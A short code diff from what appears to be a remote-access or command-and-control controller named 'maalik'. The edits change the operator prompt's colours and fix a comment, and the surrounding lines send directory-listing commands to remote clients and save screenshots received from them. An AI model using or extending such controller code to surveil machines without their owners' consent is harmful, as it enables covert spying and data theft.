@@ -265,7 +265,7 @@ class ClientManage:
                     session = False
                     break
                 ip = iplist[location]
-                main = input(Style.BRIGHT + Fore.LIGHTCYAN_EX + "maalik >> ({ip}) : ".format(ip = ip) + Style.RESET_ALL)
+                main = input(Style.BRIGHT + Fore.LIGHTGREEN_EX + "maalik >> " + Fore.LIGHTCYAN_EX +  "({ip}) : ".format(ip = ip) + Style.RESET_ALL)
                 if(main == "ls"):
                     
                     self.SendData("listdir")
@@ -784,7 +784,7 @@ Open Ports
                 # Get screenshot, Convert to jpeg and save
                 elif(client_data.startswith("SCREENSHOT")):
                     try:
-                        fileinfo = client_data.split(":") #FILE:filename.txt:555
+                        fileinfo = client_data.split(":") #SCREENSHOT:filename.txt:555
                         #print(fileinfo)
                         filename = hostList[indexof].split("/")[1].replace(" ","") + "-" + fileinfo[1]
                         filesize = int(fileinfo[2])
